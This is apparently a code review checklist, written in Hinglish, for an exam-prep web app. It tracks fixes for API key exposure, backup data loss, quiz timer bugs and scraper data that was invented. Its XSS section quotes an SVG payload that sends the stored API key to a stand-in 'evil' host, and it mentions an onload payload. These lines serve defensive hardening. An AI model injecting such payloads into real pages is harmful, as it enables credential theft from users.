# 🪿 Hamsa Vidya — Code Review & Improvement Checklist

> Full-codebase review • Created: 19 September 2026
> Sab items verified hain actual code padh kar. Har item mein exact file + line reference hai.
> Jaise-jaise kaam ho, `[ ]` ko `[x]` kar dein.

**Legend:**
`🔴 Critical` = security / data-loss • `🟠 High` = real bug • `🟡 Medium` = quality/perf • `🟢 Low` = polish

---

## Progress Summary

| Priority | Total | Done |
|---|---|---|
| 🔴 Critical | 3 | **3** |
| 🟠 High | 7 | **7** |
| 🟡 Medium | 7 | **7** |
| 🟢 Low | 5 | **5** |
| **Total** | **22** | **22** |

All five phases complete:
**Phase 1 (Trust & Safety)** — C1, C2, C3, L3 ·
**Phase 2 (Quiz Integrity)** — H1, H2, H3, H4 ·
**Phase 3 (Data Honesty)** — H5, H6, H7 ·
**Phase 4 (Hardening)** — M1, M2, M3, M6 ·
**Phase 5 (Maintainability)** — M4, M5, M7, L1, L2, L4, L5

### Follow-up work, done after the five phases

Two items originally deferred have since been completed:

- **Service worker (L4)** — `sw.js` with a network-first strategy for app code, so it delivers
  real offline capability without the stale-asset problem that made it risky. 42 checks.
- **Token/cost accounting (M6)** — exact usage from Gemini's `usageMetadata`, surfaced in
  Settings, plus a cap on the one uncapped prompt. 40 checks.

### Still open (deliberately)

None of these is a defect. Each is either data-entry work, an architectural change too large
to do safely in one pass, or something where a rushed version is worse than none:

| Deferred | Why |
|---|---|
| Hand-curated official eligibility dataset (H7) | Research/data-entry, not code. The engine already consumes it correctly. |
| Splitting the large **JS** files (M4) | Needs ES modules, which needs ~96 inline `onclick` handlers replaced by event delegation first. Real refactor, not a rename. |
| Toast/modal builders (M5) | Toasts are already centralised in `app.showToast()`; remaining modals are per-view and stateful, so merging them risks behaviour changes I can't click-test. |
| Migrating old exploratory `scratch/` scripts (L2) | They need a live API key and manual inspection. The new suites cover the same ground automatically. |
| Absolute `og:image` / sitemap `loc` (L4) | Needs a real domain, which doesn't exist yet. Documented in-file at each spot. |

## Running the checks

```powershell
npm test      # all 8 suites, 395 checks
npm run check # syntax only
```

| Suite | Checks | Covers |
|---|---|---|
| `syntax-check.js` | 31 | every JS file parses |
| `verify-ai-client.js` | 22 | transport modes, API key never leaves browser |
| `verify-backup.js` | 55 | backup/restore, FK remap, rollback, legacy format |
| `verify-quiz-scoring.js` | 65 | marking schemes, wall-clock timer, resume |
| `verify-data-honesty.js` | 66 | provenance, eligibility verdicts, attempt history |
| `verify-hardening.js` | 74 | a11y wiring, sanitizer vs 10 XSS payloads, cancellation |
| `verify-ui-utils.js` | 67 | shared helpers, `escapeJs` injection, spotlight perf |
| `verify-css-split.js` | 15 | CSS split is byte-identical to the original |
| `verify-service-worker.js` | 42 | offline shell, cache strategy, precache integrity |
| `verify-token-usage.js` | 40 | exact token accounting, response body safety, input caps |
| **Total** | **477** | |

Server suites need a live server:
```powershell
node server.js
powershell -ExecutionPolicy Bypass -File scratch/verify-server-hardening.ps1     # 23 checks
powershell -ExecutionPolicy Bypass -File scratch/verify-assets-served.ps1        # 63 assets
powershell -ExecutionPolicy Bypass -File scratch/verify-sw-precache-served.ps1   # 68 SW assets
$env:GEMINI_API_KEY="test"; $env:PORT="3100"; node server.js
powershell -ExecutionPolicy Bypass -File scratch/verify-proxy-limits.ps1
```

> `jsdom` was added as a **devDependency** so the SVG sanitizer can be tested against
> real XSS payloads in a real DOM. It is test-only and never shipped to the browser.

---

## 🔴 CRITICAL — Security & Data Loss

### [x] C1. Gemini API key browser mein exposed hai ✅ FIXED

**Scope — 17 direct browser→Google call sites across 4 files:**

| File | Direct `googleapis.com` calls |
|---|---|
| `js/gemini-service.js` | 10 (lines 81, 159, 434, 1018, 1222, 1458, 1834, 2028, 2093, 2266) |
| `js/answer-writing-service.js` | 4 (lines 176, 393, 1141, 1242) |
| `js/ai-teacher-service.js` | 2 |
| `js/notification-summary-service.js` | 1 (line 75) |

Key source: `js/gemini-service.js:17` → `getApiKey()` reads `localStorage.getItem('hamsa_gemini_api_key')`

`server.js:70-130` — `/api/gemini` proxy **already exists but is never used by the frontend.**

**Problem:** Key plain text mein `localStorage` mein hai aur har request ke URL query string mein browser se seedha Google ko jaati hai. DevTools → Application → Local Storage mein saaf dikhti hai. Network tab mein URL ke andar log hoti hai. Agar site kabhi publicly host hui to koi bhi user dusre ka key nahi, par apna key leak kar sakta hai via extensions/XSS.

**Fix plan:**
- [x] Ek single transport banaya — **`js/ai-client.js`** (`window.aiClient`), 17 call sites consolidate kiye
- [x] Transport `/api/gemini/<model>` proxy hit karta hai, key sirf server env var `GEMINI_API_KEY` mein
- [x] `localStorage` key path optional "bring your own key" (DIRECT) mode ban gaya, default PROXY
- [x] Settings view mode-aware hai — proxy par green "Secure Server Proxy", direct par warning + env-var command
- [x] L3 ka rate limiting bhi ho gaya (neeche dekho)

**Kaise implement hua:**
- `AIClient` teen modes resolve karta hai: `PROXY` (server ke paas key) / `DIRECT` (BYO localStorage key) / `UNCONFIGURED`.
  Mode ek baar `GET /api/gemini/status` probe se decide hota hai (cached, fail-safe).
- `fetchGenerateContent()` aur `fetchListModels()` native `Response` return karte hain, isliye
  saara downstream code (`res.ok`, `res.json()`, `res.status`) bina badle kaam karta hai.
- **Zaroori side-fix:** 17 jagah `if (apiKey)` capability gate ki tarah use ho raha tha. PROXY mode mein
  client ke paas key nahi hoti, to app chupke offline engine par gir jaata. Naya
  `geminiService.isAiAvailable()` add kiya aur saare gates convert kiye.
- Bonus: `AbortController` registry + per-request timeout already isi layer mein hai → M6 ka foundation ready.

**Verified:** `scratch/verify-ai-client.js` — 22/22 pass. Key assertions: PROXY mode mein *koi* URL
mein `key=` nahi, `googleapis.com` ko contact nahi hota, aur localStorage ki key browser se bahar nahi jaati.

---

### [x] C2. Backup import pehle DB wipe karta hai, phir restore ✅ FIXED

**File:** `js/db.js` → `importDatabaseBackup()`

```js
await db.quizzes.clear();
await db.questions.clear();
await db.attempts.clear();
// ...phir bulkAdd
```

**Problem:** Validation sirf itni hai — `if (!parsed.quizzes && !parsed.notes) throw`. Records ki shape check nahi hoti. Agar JSON partial/corrupt hai ya `bulkAdd` beech mein fail hua, purana data already delete ho chuka hai. Dexie transaction rollback karega, par corrupt-but-valid JSON (e.g. galat field types) chup-chaap import ho jaayega.

**Fix plan:**
- [x] Import se pehle automatic in-memory snapshot, failure par auto-rollback
- [x] Har record ki schema validate hoti hai (`BACKUP_TABLE_SPECS` mein per-table `required` fields)
- [x] "Replace" vs "Merge" mode ka choice Settings mein radio buttons se
- [x] Import ke baad summary: kitne records aaye, kitne skip hue

**Kaise implement hua (`js/db.js`):**
- Naya order: **parse → normalise → validate → snapshot → apply** — validation fail hone par
  database ko chhua hi nahi jaata. Pehle clear() sabse pehle hota tha.
- Sab kuch ek Dexie transaction mein; failure par `_restoreFromSnapshot()` chalta hai.
  Agar rollback bhi partially fail ho to error **saaf bataata hai kaunsi table recover nahi hui**
  (jhooth nahi bolta ki "sab restore ho gaya").
- **MERGE mode mein foreign key remapping:** `quizId`, `deckId` ids remap hote hain, isliye
  imported question apne imported quiz se juda rehta hai — us existing quiz se nahi jiska id sanyog se same tha.
- `inspectDatabaseBackup()` add kiya — confirm dialog se *pehle* dikhata hai kya restore hoga.

**Verified:** `scratch/verify-backup.js` — 55/55 pass. Isme rollback, FK remapping, malformed records,
non-JSON, unrelated JSON, aur legacy v1/v2 backup compatibility sab covered hai.

---

### [x] C3. "Full backup" adhoora hai — 5 tables aur profile miss ho rahe hain ✅ FIXED

**File:** `js/db.js` → `exportDatabaseBackup()` / `importDatabaseBackup()`

Export sirf yeh karta hai: `quizzes`, `questions`, `attempts`, `notes`, + kuch `preferences`.

**Missing tables** (schema `db.version(4)`–`(7)` mein defined hain par backup mein nahi the):
- [x] `customDecks`, `customCards`, `cardReviews` — pura flashcards + SRS progress
- [x] `exams`, `savedExams`
- [x] `answers`, `answerDrafts` — answer writing ka saara kaam
- [x] `aiTeacherExplanations`

**Missing localStorage:**
- [x] Student profile (`exam-profile.js` → `hamsa_exam_profile`) — ab backup mein hai
- [x] `hamsa_gemini_model`, `hamsa_last_active_date`, `hamsa_sound_muted`

**Impact:** User "Backup" bharosa karke device badalta hai aur apna flashcard SRS progress + answer writing history kho deta hai.

**Kaise implement hua:**
- Naya **format v3**: `{ formatVersion, exportedAt, summary, tables: {...12 tables}, preferences }`.
  Tables ek map mein hain, isliye aage nayi table add karne par sirf `BACKUP_TABLE_SPECS` update karna hoga.
- Legacy v1/v2 files (top-level `quizzes`/`notes` arrays + descriptive pref names) ab bhi restore hote hain —
  `_normaliseBackupPayload()` dono shapes handle karta hai.
- **API key deliberately backup mein NAHI hai** (`hamsa_gemini_api_key` excluded) — backup file
  aksar cloud/email par jaati hai, usme credential daalna theek nahi. Test isko assert karta hai.
- **Bonus bug fix:** `clearDatabase()` sirf 4 tables clear karta tha, yaani "Reset Everything" flashcard decks,
  SRS progress, written answers aur AI Teacher library chhod deta tha. Ab saari 12 tables clear hoti hain
  aur per-table removed count return hota hai. Theme/profile default se preserve rehte hain
  (`{ includePreferences: true }` se woh bhi clear kar sakte hain).
- `getDatabaseSummaryCounts()` ab 10 counts + `totalRecords` deta hai, aur Settings ka stats grid
  sab dikhata hai (pehle sirf 4 dikhte the).

---

## 🟠 HIGH — Real Bugs

### [x] H1. Practice-mode timer navigate karne par clear nahi hota (interval leak) ✅ FIXED

**Files:** `js/views/quiz-player.js:48`, `js/app.js` → `navigate()`

```js
// quiz-player.js — Practice mode
this.timerInterval = setInterval(() => { this.elapsedSeconds++; }, 1000);
```

`app.navigate()` mein flashcards, tools, aur ai-teacher ke liye cleanup hooks hain:
```js
if (this.currentView === 'flashcards' && ...) window.flashcardsView.detachKeyboard();
if (this.currentView === 'tools' && ...) window.toolsView.onLeaveView();
if (this.currentView === 'ai-teacher' && ...) window.aiTeacherView.stopSpeech();
```
**`quiz-player` ke liye koi cleanup nahi hai.** Agar user quit button ki jagah header nav se kahin aur chala jaaye:
- `setInterval` chalta rehta hai forever
- `_handleKey` window keydown listener attached rehta hai → doosre views mein A/B/C/D dabane par ghost `selectOption()` calls

Note: `submitQuiz()` aur `confirmQuit()` dono properly cleanup karte hain — leak sirf tab hota hai jab user header/mobile nav se quiz chhod de.

**Fix plan:**
- [x] `quizPlayerView.onLeaveView()` add kiya — progress save + `stopExamTimer()` + `detachKeyboard()` + lifecycle listeners detach
- [x] `toolsView` jaisa hi `onLeaveView()` contract follow kiya
- [x] **3 jagah** se call hota hai: `navigate()`, aur `startQuiz()` + `viewQuizResult()` bhi
      (yeh dono `navigate()` ko bypass karte hain, isliye inhe bhi cover karna zaroori tha)

---

### [x] H2. Mid-quiz page refresh = pura progress gone ✅ FIXED

**File:** `js/views/quiz-player.js:10-20`

Saara quiz state memory-only hai: `userAnswers`, `flaggedQuestions`, `lockedQuestions`, `currentIndex`, `remainingSeconds`.

Refresh / accidental back / browser crash = sab kuch gaya, exam timer bhi reset. Exam-prep app ke liye yeh bada functional gap hai (90-min mock test ke 60 min baad refresh ho jaaye to?).

**Fix plan:**
- [x] Attempt state autosave — answer select / flag / navigate par, plus har 5 sec, plus `beforeunload`
- [x] Refresh par "Resume Unfinished Attempt?" prompt (Resume vs Start Over)
- [x] Timer wall-clock based ho gaya (H3 dekho)

**Kaise implement hua (`js/views/quiz-player.js`):**
- `localStorage` key `hamsa_active_quiz_attempt` mein `{ quizId, currentIndex, userAnswers, flagged, locked,
  remainingSeconds, elapsedSeconds, savedAt }` save hota hai. `beforeunload` par synchronous write hota hai,
  isliye refresh/crash survive karta hai.
- **Absolute deadline ki jagah remaining time save hota hai** — warna browser raat bhar band rahe to
  poora exam window chup-chaap khatam ho jaata. Resume par deadline naye sire se banti hai.
- Resume guards: 24 ghante se purana save discard, expired exam resume nahi hota, zero-progress save ignore,
  corrupt JSON throw nahi karta, dusre quiz ka save match nahi karta.
- Submit hone par saved copy clear hoti hai; explicit "Quit" bhi clear karta hai (user ne discard chuna).
- Navigate karne par progress bachta hai, isliye Quit dialog ab batata hai
  "sirf break lena hai to navigate karo, progress safe hai".

**Side fix jo zaroori tha:** `app.showConfirmation()` mein cancel callback hi nahi tha (Cancel button
`onclick="app.hideModal()"` hardcoded tha). Resume prompt ko real either/or chahiye tha, to
`cancelText` + `onCancel` support add kiya, plus Escape-to-cancel, backdrop-click-to-cancel,
focus management, aur guarantee ki outcome exactly ek baar fire ho.

---

### [x] H3. Exam timer tick-based hai, wall-clock nahi ✅ FIXED

**File:** `js/views/quiz-player.js:91-118` (`startExamTimer()`)

```js
this.timerInterval = setInterval(() => { this.remainingSeconds--; ... }, 1000);
```

Browsers background tabs mein timers throttle karte hain (1s → 1min+). Matlab user tab switch kare to exam timer **slow ho jaata hai** — effectively extra time mil jaata hai. Real exam simulation ke liye yeh galat hai.

**Fix plan:**
- [x] `this.examDeadline = Date.now() + totalMs`
- [x] `getRemainingSeconds()` har baar `Date.now()` se compute karta hai
- [x] `visibilitychange` par recompute + display refresh, aur expiry check

**Kaise implement hua:**
- Do timer intervals the (practice ke liye ek, exam ke liye doosra) — ab ek hi clock hai.
- `getElapsedSeconds()` = `accumulatedSeconds` (pichhli sittings) + current sitting ka wall-clock delta.
  Isliye resume karne par total time sahi rehta hai.
- `elapsedSeconds` ko getter bana diya taaki purane callers (`durationSeconds`) bina badle chalein.
- Auto-submit `_timeUpHandled` flag se guard hai, aur `submitQuiz()` mein `_isSubmitting` guard hai —
  timer expiry aur manual submit ek saath fire ho to double submission nahi hoti.
- Tab background mein jaaye to save bhi ho jaata hai (`visibilitychange`).

---

### [x] H4. Negative marking support nahi hai ✅ FIXED

**File:** `js/views/quiz-player.js` → `submitQuiz()`

```js
const percentage = total > 0 ? Math.round((correct / total) * 100) : 0;
const score = correct;
```

UPSC Prelims mein −1/3, SSC mein −0.25, banking mein −0.25 negative marking hoti hai. Abhi wrong answer aur skip dono ka same effect hai (0 marks), jisse app real exam scoring simulate nahi karta — aur students ko "guess karna free hai" ki galat aadat lagti hai.

Saath hi `score` naam raw correct-count ke liye use hua hai, jo "marks" se different concept hai — naming misleading hai.

**Fix plan:**
- [x] Quiz meta mein `marksPerCorrect` + `negativeMarkPerWrong` + `scoringPreset` save hote hain
- [x] `score` ab actual marks hai, `correct` count alag
- [x] Create-quiz mein 5 presets: None / UPSC Prelims / SSC / Banking / NEET
- [x] Result view mein marks, max marks aur "−X negative marking" badge dikhta hai

**Presets (`EXAM_SCORING_PRESETS` in `js/db.js`):**

| Preset | Correct | Wrong |
|---|---|---|
| Practice | +1 | 0 |
| UPSC Prelims GS | +2 | −1/3 (0.667) |
| SSC CGL/CHSL Tier-I | +2 | −0.5 |
| IBPS / SBI Banking | +1 | −0.25 |
| NEET | +4 | −1 |

**Kaise implement hua:**
- Naya `computeQuizScore(questions, userAnswers, scoring)` — single source of truth. Return karta hai
  `correct/incorrect/skipped/attempted/accuracy/positiveMarks/marksLostToNegative/marksObtained/maxMarks/percentage`.
- `quizzes.score` ko safely repurpose kiya — verify kiya ki koi bhi view usse nahi padhta
  (sab `percentage`/`correct`/`incorrect` use karte hain), sirf db.js likhta tha.
- **Accuracy alag metric hai** — attempted questions par, marking scheme se independent.
  Isliye student dekh sakta hai "accuracy achhi thi par negative marking ne maar diya".
- Exam mode select karne par preset default `UPSC_PRELIMS` ho jaata hai, practice par `NONE` —
  par user ne khud choose kiya ho to override nahi hota (`_scoringPresetTouched` flag).
- Negative percentage genuinely possible hai aur honestly store hota hai; `charts.js` mein
  plotting ke waqt clamp kiya (display concern, data concern nahi) — warna line viewBox ke bahar chali jaati.
- Scoring API `window` par expose ki (`window.computeQuizScore`, `window.EXAM_SCORING_PRESETS`)
  taaki views top-level `const` ke cross-script lexical scoping par depend na karein.

**Ab skip aur wrong barabar nahi hain** — test explicitly assert karta hai ki
`wrongMarks < skippedMarks` UPSC scheme mein. Yahi asli behaviour change hai.

---

### [x] H5. Retake original attempt ko overwrite kar deta hai ✅ FIXED

**File:** `js/db.js` → `updateQuizCompletion()`

```js
await db.quizzes.update(numId, { completedAt, score, correct, incorrect, skipped, percentage, durationSeconds });
```

Quiz record par sirf **latest** attempt bachta hai. `attempts` table mein history log hoti hai (achha), par:
- Library / History / Dashboard sab `quizzes.percentage` padhte hain → purana score invisible
- `getAnalyticsData()` trend chart bhi sirf latest attempt use karta hai → improvement trend galat dikhta hai
- `getDashboardStats()` mein `totalQuizzesTaken = completedQuizzes.length` — 5 retakes = still 1 quiz counted

**Fix plan:**
- [x] `getDashboardStats()` aur `getAnalyticsData()` ab `attempts` table se drive hote hain
- [x] `getAttemptsForQuiz()` + `getQuizAttemptSummary()` (best / latest / previous / improvement / personal-best)
- [x] History view mein "Attempt 2 of 3" badge

**Kaise implement hua:**
- `getAttemptHistory()` naya function — flat, newest-first log, har row par quiz metadata +
  `attemptNumber` / `totalAttempts`. `id` field quiz id hi rehta hai, isliye purane row actions
  (Results / Retake / Export / Delete) bina badle chalte hain.
- Quiz History view ab **per-attempt** rows dikhata hai (pehle per-quiz). Iska naam hi
  "Attempt Log" tha par aisa behave nahi karta tha.
- Trend chart mein repeat attempts label hote hain ("Polity Quiz (attempt 2)"), isliye
  improvement graph par actually dikhta hai.
- **Legacy data safe hai:** jo quizzes attempts-log se pehle complete hue the, unhe quiz row se
  back-fill kiya jaata hai — purane stats gayab nahi hote. Test isko cover karta hai.
- Delete tooltip ab honest hai: "Delete this quiz and all N of its attempts".

**Impact example (test se):** ek quiz 3 baar attempt hua (40% → 60% → 80%).
Pehle dashboard "1 quiz taken, best 80%" dikhata tha. Ab "3 attempts, avg 60%, best 80%"
aur trend chart teeno points dikhata hai.

---

### [x] H6. Live scraper fake random data generate karta hai ✅ FIXED

**File:** `live-exams-scraper.js`

```js
vacancies: vacancies || Math.floor(Math.random() * 400) + 25,   // FreeJobAlert loop
vacancies: extractVacancies(title) || Math.floor(Math.random() * 500) + 50,  // SarkariResult loop
```

Agar title/description mein vacancy count nahi mila to **random number bhar diya jaata hai** aur user ko real data ki tarah dikhaya jaata hai. Yeh sirf bug nahi, trust issue hai.

Isi tarah guessed/hardcoded data:
- `estimateFee()` — title mein "bank" mila to ₹850 fix
- `estimateSalary()` — keyword matching se pay level guess
- `applicationDeadline` — agar date na mili to **publication + 25 din** assume
- `minAge: 18, maxAge: 32` default har exam ke liye
- `categoryAgeRelaxation: { OBC: 3, SC: 5, ST: 5, EWS: 0 }` har exam ke liye same

**Fix plan:**
- [x] Random vacancies hataye → `null`, UI "Not stated" dikhata hai
- [x] Har estimated field flag hota hai
- [x] UI par disclaimer note + per-field `approx.` marker
- [x] Guessed deadline `approx.` label ke saath

**Kaise implement hua (`live-exams-scraper.js`):**
- `Math.random()` **poori file se gayab** — test isko assert karta hai.
- Field-level provenance tracking: `createProvenance()` / `markEstimated()` / `markParsed()` /
  `summariseDataQuality()`. Har exam par `dataQuality: { estimatedFields, parsedFields,
  isEligibilityEstimated, confidence, disclaimer }`.
- Confidence: `HIGH` (kuch bhi guess nahi), `MEDIUM` (fee/salary guess), `LOW` (eligibility fields guess).
- `extractDates()` ab `{ date, isEstimated }` return karta hai.
- Per-field flags: `applicationDeadlineIsEstimated`, `applicationFee.isEstimated`,
  `payScaleIsEstimated`, `eligibility.isEstimated` + `eligibility.estimatedFields`.
- UI (`exam-alerts.js`): `_approxMark()` helper inline `approx.` badge lagata hai, aur card ke neeche
  ek warning note aata hai jab koi field inferred ho.

**Live verify (62 real exams feed se):**
| Metric | Value |
|---|---|
| Total exams | 62 |
| Vacancies actually parsed | 33 |
| **Vacancies jo pehle fake number dikhate the** | **29 (47%)** |
| Deadlines inferred | 38 of 62 |
| Confidence spread | 100% LOW |

Saare 62 LOW hain kyunki yeh feeds age limit kabhi nahi batate — yeh honest representation hai.

---

### [x] H7. Eligibility result guessed data par based hai (misleading confidence) ✅ FIXED

**Files:** `js/eligibility-engine.js`, `live-exams-scraper.js`

`EligibilityEngine.checkEligibility()` ka logic khud saaf aur well-structured hai (age relaxation, qualification hierarchy, percentage, category — sab handled). **Problem input data hai:** jo exam eligibility object aata hai woh scraper ke guesses se bana hai (H6). Matlab engine confidently `'NOT_ELIGIBLE'` bol sakta hai ek fake `maxAge: 32` ke basis par.

CGPA conversion `profile.score * 9.5` hardcoded hai (`_checkPercentage()`) — har university ka formula alag hai. Iske liye warning already add ki gayi hai, woh achhi baat hai.

**Fix plan:**
- [x] Estimated data par fail hone par `NEEDS_VERIFICATION` milta hai, `NOT_ELIGIBLE` nahi
- [x] Result card mein provenance dikhta hai (`approx.` markers + warning note + "verify" badge)
- [ ] Top exams ke liye hand-curated accurate eligibility dataset — **pending** (data-entry kaam hai, code nahi)

**Naya status model (`js/eligibility-engine.js`):**

| Situation | Status | Actionable? |
|---|---|---|
| Passes, official data | `ELIGIBLE` | yes |
| Passes, estimated data | `LIKELY_ELIGIBLE` | yes, "verify" ke saath |
| Fails, official data | `NOT_ELIGIBLE` | no |
| **Fails, estimated data** | **`NEEDS_VERIFICATION`** | no, par reason dikhta hai |

Sabse important behaviour change: 36-saal ka candidate jise scraper ne guessed `maxAge: 32` diya,
pehle confidently "Not Eligible" dikhta tha. Ab "Verify Criteria" dikhta hai + explanation ki
criteria feed se inferred hain. Koi asli job miss nahi hogi ek invented number ki wajah se.

**Zaroori side-effect jo handle karna pada:** saare scraped exams estimated hain, to naya
`LIKELY_ELIGIBLE` status introduce karne se "Eligible" filter/count **zero ho jaata**. Isliye
`EligibilityEngine.isPositive()` + `window.isEligibilityPositive()` helper banaya aur
filter/sort/count/card-border/Apply-button — 8 jagah update ki, taaki `LIKELY_ELIGIBLE`
eligible ke saath count ho par label honest rahe ("Likely Eligible · verify").

---

## 🟡 MEDIUM — Quality, Performance, Maintainability

### [x] M1. `getCompletedQuizHistory()` do baar defined hai ✅ FIXED

**File:** `js/db.js:113` aur `js/db.js:329`

Dono functions same kaam karte hain, thoda different filter logic ke saath:
- Line 113: `q.completedAt !== null && q.completedAt !== undefined`
- Line 329: `q.completedAt !== null` (undefined ko miss karta hai)

JS mein second definition first ko silently override karti hai → **line 329 wali chalti hai**, jo `undefined` completedAt ko "completed" maan legi.

- [x] Duplicate hata di — sirf ek definition bachi hai (stronger `undefined` check wali).
      H5 ke kaam ke dauraan hi ho gaya, kyunki us jagah ko `getAttemptHistory()` /
      `getAttemptsForQuiz()` / `getQuizAttemptSummary()` ne replace kar diya.

---

### [x] M2. Sanitizer inconsistently apply hota hai ✅ FIXED

**File:** `js/sanitizer.js` (implementation solid hai — DOMParser based, dangerous tags stripped, `javascript:`/`data:` protocols blocked, event handlers removed)

Quiz player isse theek se use karta hai:
```js
${window.SecurityUtils ? SecurityUtils.sanitizeHtml(q.questionText) : q.questionText}
```
Par yeh defensive fallback hi problem hai — agar `SecurityUtils` load na ho to **raw unsanitized AI output** inject ho jaata hai.

Bade view files (`study-notes.js`, `ai-teacher.js`, `answer-writing.js`, `tools.js`, `flashcards.js` — total ~12,600 lines) mein AI content ko `innerHTML` mein daalne ke bahut jagah hain jo abhi individually verify nahi ki gayi.

**Fix plan:**
- [x] Fallback pattern hataya — 7 jagah se, sanitizer ab hard dependency hai
- [x] AI-content injection audit — **ek real XSS sink mila aur fix hua** (neeche)
- [x] `marked.js` output verify kiya — sab 11 jagah pehle se sanitize ho raha tha ✓
- [x] Inline `onclick="fn('${userString}')"` quote-escaping — **M5 mein fix ho gaya**
      (`UIUtils.escapeJs` ab backslash, newline, CR, tab, U+2028/2029 aur `<` bhi escape karta hai;
      purana version sirf quotes karta tha, jo exploitable tha — M5 section mein detail hai)

**🔴 Asli XSS sink jo mila:** `ai-teacher.js:1181` aur `:2413` AI se aaya
`exp.diagram.svgContent` ko **raw `innerHTML` mein inject kar rahe the**. Aur
`ai-teacher-service.js:607` Gemini se explicitly raw `<svg>` markup maang raha hai.
Yaani prompt-injected ya poisoned response `<svg><script>fetch('//evil/?k='+localStorage.hamsa_gemini_api_key)</script></svg>`
bhej kar API key chura sakta tha. Ironically `sanitizer.js` khud `svg` ko `DANGEROUS_TAGS`
mein rakhta hai — yaani codebase ki apni policy ka violation tha.

**Fix — naya `SecurityUtils.sanitizeSvg()`:** feature delete karne ki jagah safe subset allow kiya.
Allow-list approach: sirf presentational elements (`path/rect/circle/text/lineargradient/...`) aur
safe attributes. Block: `<script>`, `<foreignObject>`, `<use>`, `<animate>`, `<set>`, `<style>`,
saare `on*` handlers, har tarah ka `href`, external `url()`.
Teeno jagah lagaya — inline render, fullscreen modal, aur SVG download (download bhi zaroori tha,
kyunki user file ko browser mein kholega to wahan script chal jaata).

**jsdom se 10 real payloads test kiye — aur isne mere hi sanitizer mein 2 bug pakde:**
1. **Root `<svg onload="alert(1)">` bach ja raha tha** — `_cleanSvgNode()` sirf *children* clean
   karta tha, root ke apne attributes kabhi nahi. Yeh maine hi introduce kiya tha aur yeh asli
   XSS hole tha. Fix: `_cleanSvgAttributes()` alag nikala, root par bhi apply kiya.
2. **Gradients strip ho rahe the** — allow-list mein `'linearGradient'` mixed-case likha tha par
   comparison `nodeName.toLowerCase()` se hota hai, to kabhi match hi nahi karta. Saath hi
   `url(#id)` block ho raha tha jo gradients ke liye zaroori hai — ab sirf external/data `url()` block hota hai.

Isliye real payloads ke against test karna zaroori tha — static checks ye dono miss kar rahe the.

---

### [x] M3. `focus-visible` styles bilkul nahi hain ✅ FIXED

**Verified:** `css/**/*.css` mein `focus-visible` ka zero match.

Poora app custom `<div>`-based interactive elements use karta hai:
```html
<div class="option-card" onclick="quizPlayerView.selectOption(0)">
<div class="palette-cell" onclick="quizPlayerView.jumpToQuestion(3)">
<div class="brand-container" onclick="app.navigate('dashboard')">
```
Yeh keyboard se reach hi nahi ho sakte (no `tabindex`, no `role`, no key handler), aur jo reachable hain unka focus indicator nahi hai.

**Fix plan:**
- [x] Naya `css/a11y.css` — global `:focus-visible`, token-based, last load hota hai
- [x] Clickable `<div>`s ko runtime par `role="button"` + `tabindex="0"` + Enter/Space handler
- [x] Confirm modal mein focus trap + Escape + backdrop click
- [x] Modal khulne par focus andar, band hone par trigger par wapas

**Kaise implement hua:**
- **96 clickable non-button elements** the (88 `<div>`, 4 `<span>`, 2 `<p>`, 2 `<h3>`) aur sirf 2 mein
  `tabindex` tha. Sab ko haath se `<button>` banana risky aur bahut bada change hota, isliye
  **centralized runtime promotion** kiya: `app.enhanceInteractiveElements()` har render ke baad
  (`refreshIcons()` se) `[onclick]` elements ko scan karke `tabindex="0"` + `role="button"` +
  `aria-label` (title se, icon-only controls ke liye) add karta hai. Ek delegated `keydown`
  handler Enter/Space ko click mein translate karta hai, Space ka page-scroll rokta hai.
- Smart exclusions: native interactive tags, backdrop/overlay/scrim (woh click-to-dismiss hain,
  control nahi — unke liye Escape hai), aur sirf `event.stopPropagation()` karne wale handlers.
- Idempotent hai (`data-keyboard-activatable` marker), to baar-baar render safe hai.
- `:focus-visible` use kiya (`:focus` nahi) — mouse users ko ring nahi dikhta, keyboard users ko
  dikhta hai. Light themes ke liye inverted halo, `forced-colors` mode support, aur
  `prefers-reduced-motion` respect.
- Skip link add kiya ("Skip to main content") — 9-item nav bypass karne ke liye, `<main id="main-content">` target.
- Confirm dialog ko `role="dialog" aria-modal="true" aria-labelledby/describedby` mila,
  Tab trap (sirf dialog ke andar move karega), aur band hone par focus wapas trigger element par.

**Baaki:** har view ke apne custom modals (flashcards, study-notes, tools) mein bhi focus trap
chahiye — woh M5 ke shared modal helper ke saath ek hi baar mein karna behtar hoga.

---

### [x] M4. Bohot bade files — split karne layak ✅ CSS DONE / JS deferred

| File | Lines |
|---|---|
| `css/components.css` | 8132 |
| `css/ai-teacher.css` | 4225 |
| `js/ai-teacher-service.js` | 3090 |
| `js/views/study-notes.js` | 3092 |
| `js/views/tools.js` | 3006 |
| `js/views/answer-writing.js` | 2678 |
| `js/views/ai-teacher.js` | 2342 |
| `js/gemini-service.js` | 2155 |

- [x] `components.css` (8132) → `css/components/` mein 10 feature files
- [x] `ai-teacher.css` (4225) → `css/ai-teacher/` mein 7 files
- [ ] Bade **view** files split — **deliberately deferred**, reason neeche
- [ ] Build step (concat + minify) — abhi zaroorat nahi, localhost par negligible

**CSS split kaise safely hua:**
CSS order-dependent hai, to mechanical split se cascade badal sakta tha. Isliye
`scratch/split-css.js` existing `/* ==== SECTION ==== */` banners par cut karta hai aur
**write karne se pehle assert karta hai ki parts ko jodne se original byte-for-byte wapas milta hai**.
Agar check fail hota to kuch likha hi nahi jaata. Parts numbered hain (`01-`…`10-`) aur
index.html unhe usi numeric order mein link karta hai, to cascade bilkul same rehta hai.
Purani files empty kar di gayi hain ek pointer comment ke saath, taaki galti se koi
unme rule na likhe (woh load hi nahi hotin).

| Before | After |
|---|---|
| `components.css` 8132 lines | 10 files, largest 2133 |
| `ai-teacher.css` 4225 lines | 7 files, largest 1526 |

**Verified:** `verify-css-split.js` (15 checks) — byte-identical concatenation, ascending
link order, every file on disk linked, no stale rules left behind. Plus
`verify-assets-served.ps1` confirms all 63 linked assets return HTTP 200.

**JS split kyun defer kiya (honest reason):**
View files ek-ek badi `class` hain. Unhe todne ke liye ES modules chahiye — aur woh
tab tak safe nahi hai jab tak ~96 inline `onclick="viewName.method()"` handlers
event delegation se replace na ho jaayein, kyunki ESM scope module-local hota hai aur
inline handlers ko **global** functions chahiye. Yaani yeh ek architectural refactor hai
(ESM + delegation + saare handlers rewrite), 2-3 files ka rename nahi. Aise bade change
ko bina browser mein click-through kiye karna risky hai, isliye maine nahi kiya —
ise ek alag planned task ke roop mein rakhna behtar hai.

---

### [x] M5. Duplication — shared utils extract karo ✅ FIXED

Repeated patterns jo kai files mein dikhe:
- Toast / loading overlay invocation
- Modal builders
- PDF export setup
